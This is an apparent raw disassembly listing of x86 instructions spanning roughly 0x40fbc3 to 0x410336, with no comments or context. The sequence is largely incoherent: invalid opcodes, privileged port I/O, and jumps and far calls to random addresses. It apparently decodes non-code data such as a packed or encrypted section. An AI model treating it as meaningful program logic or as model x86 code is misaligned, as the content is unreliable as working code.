  40fbc3:	mov    ds:0xfc9065d7,eax
  40fbc8:	push   edx
  40fbc9:	popa   
  40fbca:	adc    BYTE PTR cs:[esi+0x23],0xd3
  40fbcf:	cmp    DWORD PTR [edx-0x4a],0x60
  40fbd3:	cmp    al,0xfe
  40fbd5:	lods   al,BYTE PTR ds:[esi]
  40fbd6:	mov    dl,0xce
  40fbd8:	xchg   esi,eax
  40fbd9:	jge    0x40fb81
  40fbdb:	aas    
  40fbdc:	xchg   esi,eax
  40fbdd:	cld    
  40fbde:	loopne 0x40fc56
  40fbe0:	in     al,0xc1
  40fbe2:	cmc    
  40fbe3:	shl    DWORD PTR [ecx+esi*1],1
  40fbe6:	sahf   
  40fbe7:	loopne 0x40fba6
  40fbe9:	popf   
  40fbea:	pop    ecx
  40fbeb:	mov    gs,WORD PTR [eax+eax*8+0x6f21538f]
  40fbf2:	inc    esi
  40fbf3:	jmp    0x40fb76
  40fbf5:	push   ss
  40fbf6:	cdq    
  40fbf7:	pop    edx
  40fbf8:	stos   DWORD PTR es:[edi],eax
  40fbf9:	ins    BYTE PTR es:[edi],dx
  40fbfa:	adc    dh,ch
  40fbfc:	pop    edx
  40fbfd:	rcr    BYTE PTR [ebx-0x8],1
  40fc00:	mov    BYTE PTR [eax+ebp*1+0x58],ch
  40fc04:	push   edi
  40fc05:	and    ebx,DWORD PTR [ecx-0x124735bd]
  40fc0b:	pop    ecx
  40fc0c:	sbb    bh,bl
  40fc0e:	pop    eax
  40fc0f:	sti    
  40fc10:	repnz imul esi,DWORD PTR [esi],0xffffffe1
  40fc14:	mov    eax,ds:0xf4e0cc0c
  40fc19:	lea    ebx,[esi+0x68]
  40fc1c:	outs   dx,DWORD PTR ds:[esi]
  40fc1d:	pop    esp
  40fc1e:	cli    
  40fc1f:	rcr    DWORD PTR [ebp-0x7549aabf],cl
  40fc25:	sbb    edx,ecx
  40fc27:	inc    edx
  40fc28:	aam    0xa1
  40fc2a:	xor    ecx,DWORD PTR [ebx-0x58]
  40fc2d:	enter  0x78d8,0x84
  40fc31:	push   esi
  40fc32:	adc    BYTE PTR [edi+0x73800183],0x2f
  40fc39:	test   bh,bl
  40fc3b:	mov    ds:0xe2958cc0,eax
  40fc40:	loop   0x40fc7e
  40fc42:	stos   BYTE PTR es:[edi],al
  40fc43:	ror    BYTE PTR [esi],0x6a
  40fc46:	fcomp  DWORD PTR [ecx-0x1f533ad7]
  40fc4c:	jo     0x40fcb4
  40fc4e:	cld    
  40fc4f:	mov    ah,0xac
  40fc51:	call   0x6ee2e5f8
  40fc56:	jno    0x40fc0f
  40fc58:	hlt    
  40fc59:	add    eax,0x9d5ae455
  40fc5e:	inc    edx
  40fc5f:	cmp    BYTE PTR [esi-0x7228198e],ch
  40fc65:	pop    edi
  40fc66:	adc    DWORD PTR [eax+edi*4-0x20],eax
  40fc6a:	leave  
  40fc6b:	hlt    
  40fc6c:	push   es
  40fc6d:	nop
  40fc6e:	mov    ah,0x10
  40fc70:	es mov edx,0xc9f37772
  40fc76:	jnp    0x40fc9f
  40fc78:	test   ecx,0x53d849f8
  40fc7e:	or     BYTE PTR [esi+0x23c255a2],0x33
  40fc85:	mov    ch,0x7d
  40fc87:	hlt    
  40fc88:	sub    BYTE PTR [eax-0x7cd3162],0x5f
  40fc8f:	jp     0x40fc1c
  40fc91:	je     0x40fc4e
  40fc93:	fldenv [edi+0x153a26ad]
  40fc99:	fmulp  st(4),st
  40fc9b:	and    ebx,DWORD PTR [ebx+0x33b0df77]
  40fca1:	repnz push edi
  40fca3:	loope  0x40fd05
  40fca5:	call   0x51f6:0x41de
  40fcab:	mov    edi,gs
  40fcad:	not    eax
  40fcaf:	xchg   ecx,eax
  40fcb0:	cli    
  40fcb1:	dec    edi
  40fcb2:	sbb    bh,cl
  40fcb4:	outs   dx,BYTE PTR ds:[esi]
  40fcb5:	(bad)  
  40fcb6:	pop    edx
  40fcb7:	ficom  WORD PTR [ebx+0x142e6b5f]
  40fcbd:	cmp    al,0x51
  40fcbf:	xor    BYTE PTR [esi+esi*1-0x14a87aec],cl
  40fcc6:	cwde   
  40fcc7:	mov    dl,0xda
  40fcc9:	push   es
  40fcca:	clc    
  40fccb:	hlt    
  40fccc:	popa   
  40fccd:	push   cs
  40fcce:	ds clc 
  40fcd0:	xchg   esi,eax
  40fcd1:	int    0xcf
  40fcd3:	mov    edi,0xa8ecd160
  40fcd8:	mov    eax,ds:0x3a77b0e
  40fcdd:	cmp    BYTE PTR [eax],cl
  40fcdf:	adc    BYTE PTR [edi-0x1719ed7f],dh
  40fce5:	dec    esi
  40fce6:	mov    ah,0x77
  40fce8:	std    
  40fce9:	adc    DWORD PTR [edi],ebp
  40fceb:	ret    
  40fcec:	popa   
  40fced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcee:	push   ss
  40fcef:	(bad)  
  40fcf0:	sbb    al,0x8e
  40fcf2:	cld    
  40fcf3:	or     BYTE PTR [ecx-0x6],0x57
  40fcf7:	data16 add al,0x7e
  40fcfa:	xchg   edx,eax
  40fcfb:	mov    eax,edi
  40fcfd:	ins    DWORD PTR es:[edi],dx
  40fcfe:	xchg   DWORD PTR [eax],esp
  40fd00:	sub    DWORD PTR [esi-0x70],0x2f787077
  40fd07:	daa    
  40fd08:	fst    QWORD PTR [edx+esi*2]
  40fd0b:	rol    DWORD PTR [edx-0x35097b06],cl
  40fd11:	frstor [eax]
  40fd13:	stos   BYTE PTR es:[edi],al
  40fd14:	mov    edi,0xe9990c44
  40fd19:	scas   al,BYTE PTR es:[edi]
  40fd1a:	and    al,0xbd
  40fd1c:	sbb    ch,BYTE PTR cs:[esi-0x33]
  40fd20:	sub    al,0xb
  40fd22:	pop    edx
  40fd23:	jp     0x40fd5f
  40fd25:	push   ebp
  40fd26:	or     eax,0x448c56f2
  40fd2b:	jge    0x40fd4a
  40fd2d:	sti    
  40fd2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd2f:	push   0xffffffa4
  40fd31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd32:	jmp    0x640af5c5
  40fd37:	sbb    al,0x75
  40fd39:	into   
  40fd3a:	mov    edi,0xf4606cca
  40fd3f:	xor    edi,DWORD PTR [esi-0x1b]
  40fd42:	mov    ds:0xa8e9c946,al
  40fd47:	push   ds
  40fd48:	fisttp WORD PTR [ebp+0x38b90296]
  40fd4e:	push   ecx
  40fd4f:	mov    ds:0xa9da9e7b,eax
  40fd54:	inc    esi
  40fd55:	push   esp
  40fd56:	lds    edx,FWORD PTR [eax]
  40fd58:	les    edi,FWORD PTR [ebp+0x59de2d18]
  40fd5e:	shl    BYTE PTR [esi],1
  40fd60:	adc    al,BYTE PTR ds:0x61c15ae0
  40fd66:	mov    es,WORD PTR [ecx+0x37caac9]
  40fd6c:	cwde   
  40fd6d:	retf   0x4ed4
  40fd70:	cdq    
  40fd71:	fucomp st(6)
  40fd73:	(bad)  
  40fd74:	xchg   edi,eax
  40fd75:	lea    edx,[ecx-0x66c75ffd]
  40fd7b:	or     BYTE PTR [esi-0x6e],dl
  40fd7e:	(bad)  
  40fd7f:	pop    ds
  40fd80:	inc    BYTE PTR [ebx]
  40fd82:	add    esp,eax
  40fd84:	test   BYTE PTR [ebp+0x33572d97],ch
  40fd8a:	call   0x64f68651
  40fd8f:	mov    ds:0xa52a38a7,eax
  40fd94:	cmp    eax,0xf9a9838c
  40fd99:	push   ss
  40fd9a:	and    ebp,DWORD PTR [ebx+eiz*1+0x1d]
  40fd9e:	push   ecx
  40fd9f:	push   esi
  40fda0:	dec    edx
  40fda1:	dec    esp
  40fda2:	test   al,ah
  40fda4:	cmp    BYTE PTR [edx-0x6d],0xfa
  40fda8:	push   cs
  40fda9:	hlt    
  40fdaa:	add    al,0x53
  40fdac:	xchg   esp,eax
  40fdad:	int    0x8e
  40fdaf:	adc    al,0x5b
  40fdb1:	xchg   ecx,eax
  40fdb2:	dec    ecx
  40fdb3:	inc    esp
  40fdb4:	les    esp,FWORD PTR [esp+esi*8-0x46dbe3ae]
  40fdbb:	cmp    BYTE PTR ds:0x995905ab,0x43
  40fdc2:	jmp    0x40fe3e
  40fdc4:	push   esi
  40fdc5:	inc    edi
  40fdc6:	bswap  ebx
  40fdc8:	pop    ebx
  40fdc9:	mov    ds:0xae12655b,eax
  40fdce:	out    0x60,al
  40fdd0:	ret    0x82e6
  40fdd3:	jmp    0xccc1c145
  40fdd8:	aaa    
  40fdd9:	pop    esp
  40fdda:	sub    esp,DWORD PTR [edi]
  40fddc:	jmp    0xe59ce06f
  40fde1:	xchg   edx,eax
  40fde2:	mov    al,ds:0xe4dd7c35
  40fde7:	mov    al,ds:0xabb94eb0
  40fdec:	mov    eax,0x87292ca2
  40fdf1:	xchg   ebx,eax
  40fdf2:	ins    DWORD PTR es:[edi],dx
  40fdf3:	nop
  40fdf4:	mov    DWORD PTR [eax+0x1908c952],eax
  40fdfa:	(bad)  
  40fdfb:	(bad)  
  40fdfc:	pop    eax
  40fdfd:	jns    0x40fda1
  40fdff:	cmp    BYTE PTR [ecx+0x5f2ac3f9],0x53
  40fe06:	imul   al
  40fe08:	les    esi,FWORD PTR [ebx-0x11cdbe3a]
  40fe0e:	mov    ebx,gs
  40fe10:	inc    ecx
  40fe11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe12:	pusha  
  40fe13:	clc    
  40fe14:	(bad)  
  40fe15:	mov    ebx,0x9318cded
  40fe1a:	mov    ch,0xf
  40fe1c:	ret    
  40fe1d:	test   BYTE PTR [edi+0x34b90783],al
  40fe23:	icebp  
  40fe24:	or     eax,ebp
  40fe26:	ins    DWORD PTR es:[edi],dx
  40fe27:	ret    
  40fe28:	pop    esi
  40fe29:	fld    TBYTE PTR [ebx+0x7]
  40fe2c:	adc    BYTE PTR [eax],0x7e
  40fe2f:	mov    esp,0xf0f71f02
  40fe34:	test   eax,0xb9c5c74a
  40fe39:	test   al,0xbe
  40fe3b:	ror    DWORD PTR [eax],1
  40fe3d:	jecxz  0x40fdf9
  40fe3f:	cmp    ebp,DWORD PTR [edx-0x40d330f7]
  40fe45:	fcomp  QWORD PTR [edx]
  40fe47:	mov    dh,0x8e
  40fe49:	or     al,0x71
  40fe4b:	leave  
  40fe4c:	out    0xc9,al
  40fe4e:	pop    ecx
  40fe4f:	jecxz  0x40fe52
  40fe51:	cwde   
  40fe52:	gs retf 0xb3f7
  40fe56:	shl    DWORD PTR [esi],0x2b
  40fe59:	imul   ebp,DWORD PTR [edx],0xffffffdb
  40fe5c:	div    BYTE PTR [ebp+0x34]
  40fe5f:	aas    
  40fe60:	add    edx,DWORD PTR [edi+ebp*2-0x12e62222]
  40fe67:	stc    
  40fe68:	push   edx
  40fe69:	das    
  40fe6a:	sub    al,0x1a
  40fe6c:	xchg   edx,eax
  40fe6d:	push   edi
  40fe6e:	sbb    al,0x8d
  40fe70:	pop    eax
  40fe71:	adc    edx,DWORD PTR [ecx-0x7e]
  40fe74:	mov    ch,0xd6
  40fe76:	lods   al,BYTE PTR ds:[esi]
  40fe77:	inc    edi
  40fe78:	test   BYTE PTR [edi-0x2fed744f],0x96
  40fe7f:	fidiv  DWORD PTR [edi+0x48]
  40fe82:	mov    ch,BYTE PTR [ebx]
  40fe84:	inc    ecx
  40fe85:	push   edi
  40fe86:	outs   dx,BYTE PTR ds:[esi]
  40fe87:	stos   DWORD PTR es:[edi],eax
  40fe88:	pushf  
  40fe89:	out    dx,al
  40fe8a:	pop    ds
  40fe8b:	cli    
  40fe8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe8d:	xchg   ebp,eax
  40fe8e:	mov    al,0x95
  40fe90:	addr16 inc ebx
  40fe92:	adc    eax,0x22f1b947
  40fe97:	gs adc al,0x1a
  40fe9a:	(bad)  
  40fe9c:	xlat   BYTE PTR ds:[ebx]
  40fe9d:	xchg   esp,eax
  40fe9e:	aad    0xb2
  40fea0:	and    BYTE PTR [ebx-0x46fe5e34],bl
  40fea6:	mov    eax,0x176b62c4
  40feab:	sub    ebx,DWORD PTR [edx-0x54]
  40feae:	loope  0x40feb7
  40feb0:	and    eax,0x73c7e4b8
  40feb5:	pop    ss
  40feb6:	jno    0x40fe61
  40feb8:	ja     0x40feb2
  40feba:	mov    ecx,0x705a65b8
  40febf:	cmovl  ebx,DWORD PTR ds:0x3b5c2511
  40fec6:	adc    eax,0xc8cd87a2
  40fecb:	ins    BYTE PTR es:[edi],dx
  40fecc:	or     DWORD PTR [edi],ebx
  40fece:	pop    ss
  40fecf:	xor    esp,eax
  40fed1:	jecxz  0x40fe5c
  40fed3:	mov    ds:0xc309c6f9,al
  40fed8:	test   BYTE PTR [edi+0x70],0xde
  40fedc:	in     eax,dx
  40fedd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fede:	sub    eax,0xdc1dd872
  40fee3:	cli    
  40fee4:	mov    cl,0xda
  40fee6:	repz pop esp
  40fee8:	inc    DWORD PTR [edx-0x77]
  40feeb:	out    0x4c,eax
  40feed:	(bad)  
  40feee:	adc    eax,0x17a1c198
  40fef3:	bound  ecx,QWORD PTR ds:0xa7cecd98
  40fef9:	sahf   
  40fefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fefb:	or     dh,BYTE PTR [edi+eax*2]
  40fefe:	sub    BYTE PTR ds:0xbe298f3d,ch
  40ff04:	dec    eax
  40ff05:	mov    ebp,0x9f026d13
  40ff0a:	mov    cl,0x80
  40ff0c:	fsub   st,st(6)
  40ff0e:	jne    0x40fe98
  40ff10:	loop   0x40fed8
  40ff12:	push   es
  40ff13:	mov    ebx,0x1936059c
  40ff18:	daa    
  40ff19:	pop    ebp
  40ff1a:	loopne 0x40ff45
  40ff1c:	jmp    0x3ec51507
  40ff21:	cld    
  40ff22:	xor    ch,BYTE PTR [ecx-0x2dcd774]
  40ff28:	pop    es
  40ff29:	jb     0x40feaf
  40ff2b:	or     eax,0x5b8a736b
  40ff30:	sub    eax,0x57196459
  40ff35:	sub    ecx,DWORD PTR [edx+0x755ca911]
  40ff3b:	dec    ebp
  40ff3c:	hlt    
  40ff3d:	ret    0xef3e
  40ff40:	mov    al,ds:0x7de719ef
  40ff45:	mov    ebx,0xcd376a01
  40ff4a:	nop
  40ff4b:	jmp    0x9b850d22
  40ff50:	call   0xc5239811
  40ff55:	push   ecx
  40ff56:	out    0x6d,eax
  40ff58:	push   ebp
  40ff59:	(bad)  
  40ff5a:	out    dx,eax
  40ff5b:	add    eax,0x6f869dff
  40ff60:	jmp    0x8e7213c
  40ff65:	ret    
  40ff66:	std    
  40ff67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff69:	lods   eax,DWORD PTR ds:[esi]
  40ff6a:	xchg   BYTE PTR [edi],ch
  40ff6c:	clc    
  40ff6d:	ins    DWORD PTR es:[edi],dx
  40ff6e:	int3   
  40ff6f:	pop    eax
  40ff70:	mov    ah,0xea
  40ff72:	or     dl,bh
  40ff74:	loopne 0x40ff22
  40ff76:	or     esp,DWORD PTR [ecx]
  40ff78:	les    edx,FWORD PTR [edi]
  40ff7a:	out    dx,al
  40ff7b:	ror    DWORD PTR [eax-0x17bd9741],0x27
  40ff82:	idiv   BYTE PTR [ecx]
  40ff84:	sar    DWORD PTR [edi+0xa863dee],0x4
  40ff8b:	addr16 cld 
  40ff8d:	inc    edi
  40ff8e:	dec    edi
  40ff8f:	(bad)  
  40ff90:	retf   0x50af
  40ff93:	sbb    al,0x39
  40ff95:	in     eax,0xc1
  40ff97:	das    
  40ff98:	mov    bh,BYTE PTR [ebx]
  40ff9a:	mov    edi,0x1231306a
  40ff9f:	push   eax
  40ffa0:	xchg   DWORD PTR [esi+edx*8],edi
  40ffa3:	out    dx,al
  40ffa4:	imul   edi,ecx,0x86b606f0
  40ffaa:	int    0xb8
  40ffac:	inc    ebx
  40ffad:	daa    
  40ffae:	push   ds
  40ffaf:	arpl   bx,sp
  40ffb1:	jns    0x40ffc1
  40ffb3:	cmp    BYTE PTR [eax],ah
  40ffb5:	jb     0x40ff6b
  40ffb7:	dec    esp
  40ffb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb9:	push   ebp
  40ffba:	pop    ecx
  40ffbb:	push   0x31
  40ffbd:	xor    eax,0x7e6ab4b4
  40ffc2:	jmp    0xf1920f27
  40ffc7:	cmp    bl,BYTE PTR [esi]
  40ffc9:	shl    DWORD PTR [edx+eiz*2+0x3d],0x81
  40ffce:	clc    
  40ffcf:	mov    esp,0x4c7eadb7
  40ffd4:	lods   al,BYTE PTR ds:[esi]
  40ffd5:	pop    eax
  40ffd6:	xchg   edx,eax
  40ffd7:	and    DWORD PTR [eax-0x36],ebp
  40ffda:	jg     0x40ff64
  40ffdc:	(bad)
  40ffe0:	test   dh,ah
  40ffe2:	inc    edx
  40ffe3:	icebp  
  40ffe4:	test   al,0x18
  40ffe6:	fmul   QWORD PTR ds:0xbcf44bb
  40ffec:	ins    BYTE PTR es:[edi],dx
  40ffed:	cmp    ah,BYTE PTR [edi]
  40ffef:	call   0xd549:0xff189b6c
  40fff6:	aad    0xe0
  40fff8:	sbb    eax,0x3e610afb
  40fffd:	fadd   DWORD PTR [edi+0x9]
  410000:	lahf   
  410001:	mov    al,ds:0xdf6cd0d0
  410006:	sbb    BYTE PTR [ecx],bl
  410008:	inc    ecx
  410009:	ins    BYTE PTR es:[edi],dx
  41000a:	cmp    eax,0xf4ffea9c
  41000f:	mov    ah,0x81
  410011:	cmp    DWORD PTR [ebp+ebx*4-0x1c],edx
  410015:	sub    ebx,DWORD PTR [edx+ecx*1-0x10]
  410019:	retf   
  41001a:	shl    BYTE PTR [esi],cl
  41001c:	dec    eax
  41001d:	call   0xc3dde8b4
  410022:	(bad)  
  410023:	in     al,0x61
  410025:	pop    edi
  410026:	push   ss
  410027:	(bad)
  41002a:	cmc    
  41002b:	mov    cl,0x51
  41002d:	jmp    0xa710:0x730e6b1f
  410034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410035:	ret    
  410036:	xor    bh,BYTE PTR [ecx]
  410038:	mov    BYTE PTR cs:[edi-0x2f],dl
  41003c:	retf   0xe5e6
  41003f:	ret    0xdaa4
  410042:	std    
  410043:	dec    ecx
  410044:	jnp    0x40ffe7
  410046:	or     DWORD PTR [eax-0x2e],eax
  410049:	mov    al,ds:0xbaaa0523
  41004e:	das    
  41004f:	adc    dh,BYTE PTR [ecx+0x2]
  410052:	xchg   esp,edx
  410054:	sub    al,0xf
  410056:	les    edi,FWORD PTR [ecx]
  410058:	in     eax,0xad
  41005a:	mov    dh,0x3d
  41005c:	aas    
  41005d:	sub    eax,0x92a0ac24
  410062:	loopne 0x40fff8
  410064:	mov    ds:0x9a116fcd,al
  410069:	fistp  WORD PTR [edx+0x716c1ab9]
  41006f:	sti    
  410070:	mov    ecx,0xb9cc086f
  410075:	scas   eax,DWORD PTR es:[edi]
  410076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410077:	dec    edi
  410078:	mov    al,ds:0xb4bb3d4c
  41007d:	lea    edx,[eax+eiz*4+0x45]
  410081:	sbb    bh,BYTE PTR [edi-0x532b4db]
  410087:	(bad)  
  410088:	add    eax,0x91f8653b
  41008d:	loope  0x410085
  41008f:	rol    BYTE PTR [bx+si-0x3262],cl
  410094:	ret    
  410095:	xor    BYTE PTR [edx+0x2e],al
  410098:	iret   
  410099:	xor    DWORD PTR [ebp+0x392c0b5e],edx
  41009f:	mov    bl,0x58
  4100a1:	mov    al,ds:0xcb024a46
  4100a6:	ror    DWORD PTR [edi-0x2a],0xf2
  4100aa:	call   0x97f9:0xc579bb92
  4100b1:	mov    esi,DWORD PTR [ecx]
  4100b3:	stc    
  4100b4:	mov    DWORD PTR [esi-0x5b],edx
  4100b7:	push   es
  4100b8:	call   esp
  4100ba:	sub    bh,BYTE PTR [edi+0x35a5ff80]
  4100c0:	xor    eax,0x85f3b81c
  4100c5:	pop    ebx
  4100c6:	enter  0x5809,0x28
  4100ca:	les    edx,FWORD PTR [edx]
  4100cc:	scas   al,BYTE PTR es:[edi]
  4100cd:	pop    ss
  4100ce:	push   es
  4100cf:	adc    eax,ecx
  4100d1:	(bad)  
  4100d3:	push   es
  4100d4:	xchg   esi,eax
  4100d5:	fiadd  WORD PTR [ecx]
  4100d7:	xor    ecx,DWORD PTR [ebx+0x7fa76eb7]
  4100dd:	cmp    esi,DWORD PTR [esi+0x6c7b4ded]
  4100e3:	stos   BYTE PTR es:[edi],al
  4100e4:	fld    TBYTE PTR [di+0x6980]
  4100e9:	out    0x39,al
  4100eb:	clc    
  4100ec:	mov    ?,WORD PTR [edi+0x444a69fb]
  4100f2:	bound  edx,QWORD PTR [esi]
  4100f4:	fisubr WORD PTR [eax+0x108a3f6e]
  4100fa:	jecxz  0x410161
  4100fc:	mov    ecx,DWORD PTR [esi]
  4100fe:	add    bh,BYTE PTR [edi]
  410100:	pushf  
  410101:	sub    BYTE PTR [edi-0xb],cl
  410104:	add    eax,DWORD PTR [esi+edx*2-0x7d64d826]
  41010b:	xchg   esi,eax
  41010c:	shl    DWORD PTR [ebx+0x5cd877ab],0x60
  410113:	adc    al,0xba
  410115:	xchg   esp,eax
  410116:	cmp    eax,0xe8f9e322
  41011b:	jnp    0x4100be
  41011d:	into   
  41011e:	fucomp st(3)
  410120:	(bad)  
  410121:	and    al,0xf7
  410123:	mov    esi,0x793805cd
  410128:	dec    edx
  410129:	sub    ebx,DWORD PTR ss:[ecx+0x4f50afbc]
  410130:	inc    edi
  410131:	lahf   
  410132:	mov    ds:0x4cf14675,eax
  410137:	push   cs
  410138:	pop    edx
  410139:	test   eax,0x4ce1f8b9
  41013e:	outs   dx,BYTE PTR ds:[esi]
  41013f:	xor    al,BYTE PTR [edx]
  410141:	test   al,0x6f
  410143:	inc    eax
  410144:	gs add eax,ebp
  410147:	shl    BYTE PTR [edi+0x7fd10ade],1
  41014d:	pop    edx
  41014e:	inc    ebp
  41014f:	inc    edi
  410150:	cdq    
  410151:	xchg   edx,esp
  410153:	or     ebp,DWORD PTR [eax-0x69b88f45]
  410159:	pop    ds
  41015a:	fdiv   QWORD PTR [ebp+ebx*8-0x73]
  41015e:	sbb    BYTE PTR [edx-0x77847153],0xa2
  410165:	clc    
  410166:	jbe    0x410160
  410168:	mov    DWORD PTR [ecx+0x44],esp
  41016b:	push   ebp
  41016c:	jne    0x410116
  41016e:	sbb    edi,esp
  410170:	arpl   WORD PTR [edi-0x6f491c44],bp
  410176:	scas   al,BYTE PTR es:[edi]
  410177:	sbb    al,0xbb
  410179:	stc    
  41017a:	cmp    al,0x40
  41017c:	inc    edx
  41017d:	das    
  41017e:	inc    ebp
  41017f:	jno    0x4101db
  410181:	pop    edi
  410182:	sahf   
  410183:	mov    DWORD PTR [eax+0x44],ecx
  410186:	rcl    BYTE PTR [ecx-0xb],cl
  410189:	addr16 (bad) 
  41018b:	cmp    BYTE PTR [edi+ecx*8],ch
  41018e:	mov    al,0x7
  410190:	jmp    0x4101ef
  410192:	ss int 0xf5
  410195:	push   esp
  410196:	fcom   QWORD PTR [edx+0xc]
  410199:	push   0x659e1a0d
  41019e:	xlat   BYTE PTR ds:[ebx]
  41019f:	js     0x41013e
  4101a1:	add    ecx,DWORD PTR [eax]
  4101a3:	mov    bl,0x33
  4101a5:	(bad)  
  4101a6:	jmp    0x4101ee
  4101a8:	mov    esp,0x661095d4
  4101ad:	push   ss
  4101ae:	inc    esi
  4101af:	rol    DWORD PTR [ecx+edx*8-0x5a],0xb6
  4101b4:	cmp    BYTE PTR [esi-0x70b8e57b],al
  4101ba:	and    BYTE PTR [ebx+0x7e],cl
  4101bd:	mov    ds:0xc9f77276,eax
  4101c2:	dec    esi
  4101c3:	outs   dx,BYTE PTR ds:[esi]
  4101c4:	sub    eax,0x42cffcab
  4101c9:	or     bh,dl
  4101cb:	jae    0x4101fe
  4101cd:	jns    0x410162
  4101cf:	push   0xffffffde
  4101d1:	xchg   BYTE PTR [eax],cl
  4101d3:	cli    
  4101d4:	pop    ss
  4101d5:	jp     0x410180
  4101d7:	inc    esi
  4101d8:	mov    bl,BYTE PTR [esi]
  4101da:	add    eax,0x90f708a1
  4101df:	adc    al,0x58
  4101e1:	sbb    ebp,DWORD PTR [edx-0x6f64b452]
  4101e7:	div    DWORD PTR [edx+ebp*2]
  4101ea:	cld    
  4101eb:	outs   dx,BYTE PTR ds:[esi]
  4101ec:	popa   
  4101ed:	scas   eax,DWORD PTR es:[edi]
  4101ee:	push   eax
  4101ef:	fisubr DWORD PTR [esi-0x2f]
  4101f2:	stos   BYTE PTR es:[edi],al
  4101f3:	mov    dh,al
  4101f5:	adc    DWORD PTR [edx+edx*4],edi
  4101f8:	lods   al,BYTE PTR ds:[esi]
  4101f9:	in     eax,dx
  4101fa:	ret    0x18ca
  4101fd:	xor    ebp,DWORD PTR [eax-0x29]
  410200:	xchg   esp,eax
  410201:	neg    BYTE PTR ds:0x82cd0575
  410207:	mov    edi,0xca365e9c
  41020c:	hlt    
  41020d:	jbe    0x41026d
  41020f:	pop    esp
  410210:	dec    esp
  410211:	cwde   
  410212:	adc    DWORD PTR [eax],ebp
  410214:	and    cl,BYTE PTR [esi-0x28]
  410217:	enter  0xae7e,0x9
  41021b:	arpl   WORD PTR [eax-0x35],bx
  41021e:	outs   dx,DWORD PTR ds:[esi]
  41021f:	mov    ds:0xd7ef9fab,al
  410224:	or     eax,0x4370ef55
  410229:	add    al,0xc3
  41022b:	stos   BYTE PTR es:[edi],al
  41022c:	adc    BYTE PTR [eax-0x2],bl
  41022f:	fwait
  410230:	add    bh,dl
  410232:	(bad)  
  410233:	in     eax,dx
  410234:	adc    dl,BYTE PTR [eax+ebx*1-0x46]
  410238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410239:	dec    ecx
  41023a:	rcl    BYTE PTR [ebp-0x16],1
  41023d:	push   cs
  41023e:	(bad)  
  41023f:	push   ss
  410240:	xor    BYTE PTR [edi+0xf63cc6e],0xb1
  410247:	push   esi
  410248:	inc    edi
  410249:	or     BYTE PTR [ebx+edi*1],0x39
  41024d:	sbb    eax,0x83ed34
  410252:	jl     0x41027a
  410254:	dec    BYTE PTR [edx+0x7a]
  410257:	or     ch,dh
  410259:	ror    DWORD PTR [eax+0x343b3b25],1
  41025f:	push   edx
  410260:	jle    0x4101f7
  410262:	pop    DWORD PTR [edx]
  410264:	mov    edx,0xb56772f6
  410269:	jnp    0x410288
  41026b:	fucomi st,st(7)
  41026d:	popa   
  41026e:	or     dh,BYTE PTR [esi-0x5d1b59e5]
  410274:	add    bh,dl
  410276:	ss sub eax,0x420b2e3d
  41027c:	pop    esp
  41027d:	pop    esp
  41027e:	pop    esp
  41027f:	clc    
  410280:	or     al,0xbe
  410282:	xor    ebx,ebx
  410284:	dec    ebp
  410285:	sub    edx,DWORD PTR [ecx]
  410287:	(bad)  
  410288:	aas    
  410289:	mov    bl,0xed
  41028b:	cld    
  41028c:	aad    0x4d
  41028e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41028f:	test   DWORD PTR [eax-0x51],edx
  410292:	sti    
  410293:	pop    ebp
  410294:	sbb    al,0xb7
  410296:	ds fadd st,st(7)
  410299:	push   eax
  41029a:	rcr    ch,cl
  41029c:	adc    DWORD PTR [ebx-0x1f],esi
  41029f:	(bad)  
  4102a0:	cld    
  4102a1:	iret   
  4102a2:	call   0x4c6a:0xa783b233
  4102a9:	idiv   BYTE PTR [ebx-0x278c783e]
  4102af:	sub    al,0x83
  4102b1:	cvtdq2ps xmm3,XMMWORD PTR [ebx+0x6c]
  4102b5:	push   ecx
  4102b6:	pop    eax
  4102b7:	add    DWORD PTR [esi],eax
  4102b9:	jmp    0x7a6fb61b
  4102be:	mov    esi,0x547cab84
  4102c3:	ss leave 
  4102c5:	push   edx
  4102c6:	cmp    al,0xa2
  4102c8:	cmc    
  4102c9:	adc    BYTE PTR [ecx-0x20ed8dd],dh
  4102cf:	lds    esp,FWORD PTR [ecx]
  4102d1:	xchg   DWORD PTR [esi],edx
  4102d3:	cld    
  4102d4:	cmp    DWORD PTR [eax+0x6d],edx
  4102d7:	std    
  4102d8:	xor    ah,0xef
  4102db:	popf   
  4102dc:	clc    
  4102dd:	jns    0x410290
  4102df:	(bad)  
  4102e0:	out    0xdd,al
  4102e2:	xchg   ebp,eax
  4102e3:	sar    BYTE PTR [ecx+0x24dd7602],cl
  4102e9:	adc    BYTE PTR [edi],cl
  4102eb:	jne    0x4102b4
  4102ed:	imul   ebx,DWORD PTR [ecx],0xe0cb3439
  4102f3:	pop    edx
  4102f4:	std    
  4102f5:	dec    ebx
  4102f6:	aam    0xf6
  4102f8:	or     ah,BYTE PTR [eax+ebx*2-0xc1580a0]
  4102ff:	add    al,cl
  410301:	rcl    DWORD PTR [esi-0x13],1
  410304:	out    0xa5,eax
  410306:	shl    BYTE PTR [eax+0x4a3f362e],1
  41030c:	shr    BYTE PTR [ebp+0x33],cl
  41030f:	adc    ebx,DWORD PTR [ecx]
  410311:	and    dl,BYTE PTR [edi+0x3c]
  410314:	ud0    ebx,DWORD PTR [edi+0x5681636a]
  41031b:	ins    DWORD PTR es:[edi],dx
  41031c:	sbb    bl,BYTE PTR [eax]
  41031e:	fcom   st(4)
  410320:	jmp    0xa6ab:0xff27a435
  410327:	xlat   BYTE PTR ds:[ebx]
  410328:	aad    0x66
  41032a:	and    esp,ebp
  41032c:	xor    BYTE PTR [edx],dh
  41032e:	daa    
  41032f:	mov    WORD PTR [ebp-0x3b082c10],es
  410335:	inc    esp
  410336:	stos   BYTE PTR es:[edi],al
